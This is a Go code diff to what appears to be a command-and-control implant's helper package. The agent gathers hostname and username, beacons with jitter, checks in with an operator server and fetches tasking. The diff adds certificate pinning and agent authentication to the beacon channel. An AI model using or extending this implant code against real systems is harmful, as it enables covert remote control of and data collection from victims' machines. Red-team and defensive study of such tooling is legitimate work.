@@ -3,7 +3,8 @@
 package agent_helper
 
 import (
-	crand "crypto/rand"
+	"crypto/sha256"
+	"crypto/subtle"
 	"crypto/tls"
 	"encoding/hex"
 	"fmt"
@@ -21,6 +22,29 @@ import (
 )
 
 var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano()))
+
+func pinnedTLSConfig() *tls.Config {
+	return &tls.Config{
+		MinVersion:         tls.VersionTLS12,
+		InsecureSkipVerify: true, // Certificate identity is verified by the SHA-256 pin below.
+		VerifyConnection: func(state tls.ConnectionState) error {
+			if len(state.PeerCertificates) == 0 {
+				return fmt.Errorf("server did not provide a certificate")
+			}
+
+			expected, err := hex.DecodeString(agent_config.ServerCertSHA256)
+			if err != nil || len(expected) != sha256.Size {
+				return fmt.Errorf("invalid embedded server certificate fingerprint")
+			}
+
+			actual := sha256.Sum256(state.PeerCertificates[0].Raw)
+			if subtle.ConstantTimeCompare(actual[:], expected) != 1 {
+				return fmt.Errorf("server certificate fingerprint mismatch")
+			}
+			return nil
+		},
+	}
+}
 
 type CallbackInfo struct {
 	Callback_freq int
@@ -47,34 +71,52 @@ type ResultsCreate struct {
 
 var CustomClient = &http.Client{
 	Transport: &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		TLSClientConfig:   pinnedTLSConfig(),
 		DisableKeepAlives: true,
 	},
 	Timeout: 10 * time.Second,
 }
 
 func GatherInfo() InitialInfo {
-	bytes := make([]byte, 4)
-	_, err := crand.Read(bytes)
-	if err != nil {
-		panic(err)
-	}
-	hexString := hex.EncodeToString(bytes)
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
 
 	hostInfo := InitialInfo{
-		Session:       hexString,
+		Session:       agent_config.AgentId,
 		Hostname:      hostname,
 		Username:      currentUser.Username,
 		Callback_freq: agent_config.CallbackVal,
 		Jitter:        agent_config.JitterVal,
 	}
 	if debug.Debug {
-		fmt.Printf("[*] Gathered initial info:\nsession: %s, hostname: %s, username: %s\ncb freq: %d, jitter: %d\n", 
-		hostInfo.Session, hostInfo.Hostname, hostInfo.Username, hostInfo.Callback_freq, hostInfo.Jitter)
+		fmt.Printf("[*] Gathered initial info:\nsession: %s, hostname: %s, username: %s\ncb freq: %d, jitter: %d\n",
+			hostInfo.Session, hostInfo.Hostname, hostInfo.Username, hostInfo.Callback_freq, hostInfo.Jitter)
 	}
 	return hostInfo
+}
+
+func agentRequest(method string, url string, body io.Reader) (*http.Request, error) {
+	req, err := http.NewRequest(method, url, body)
+	if err != nil {
+		return nil, err
+	}
+
+	for key, value := range agent_config.ReqHeaders {
+		req.Header.Set(key, value)
+	}
+	req.Header.Set(
+		"Authorization",
+		fmt.Sprintf("Agent %s:%s", agent_config.AgentId, agent_config.AgentSecret),
+	)
+	return req, nil
+}
+
+func AgentGet(client *http.Client, url string) (*http.Response, error) {
+	req, err := agentRequest(http.MethodGet, url, nil)
+	if err != nil {
+		return nil, err
+	}
+	return client.Do(req)
 }
 
 func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
@@ -105,18 +147,18 @@ func CheckIn(serverAddr string, session string) (int, error) {
 			return http.ErrUseLastResponse
 		},
 		Transport: &http.Transport{
-			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig:   pinnedTLSConfig(),
 			DisableKeepAlives: true,
 		},
 		Timeout: 10 * time.Second,
 	}
 
-	resp, err := client.Get(url)
+	resp, err := AgentGet(client, url)
 	if debug.Debug {
 		fmt.Printf("[*] Firing health checkin to: %s\n", serverAddr+"/health/"+session)
 	}
 	if err != nil {
-		return 0, nil
+		return 0, err
 	}
 	defer resp.Body.Close()
 	return resp.StatusCode, nil
@@ -125,7 +167,7 @@ func CheckIn(serverAddr string, session string) (int, error) {
 func FetchTasking(serverAddr string, session string) (string, error) {
 	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
 
-	resp, err := CustomClient.Get(url)
+	resp, err := AgentGet(CustomClient, url)
 	if debug.Debug {
 		fmt.Printf("[*] Fetching tasking: %s\n", serverAddr+"/tasks/"+session)
 	}
@@ -133,6 +175,9 @@ func FetchTasking(serverAddr string, session string) (string, error) {
 		return "", err
 	}
 	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("task fetch returned HTTP %d", resp.StatusCode)
+	}
 	bodyBytes, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return "", err
@@ -161,13 +206,9 @@ func PostJson(url string, payload interface{}) (int, error) {
 	if err != nil {
 		return 0, err
 	}
-	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+	req, err := agentRequest(http.MethodPost, url, bytes.NewBuffer(jsonData))
 	if err != nil {
 		return 0, err
-	}
-
-	for key, value := range agent_config.ReqHeaders {
-		req.Header.Set(key, value)
 	}
 	resp, err := CustomClient.Do(req)
 
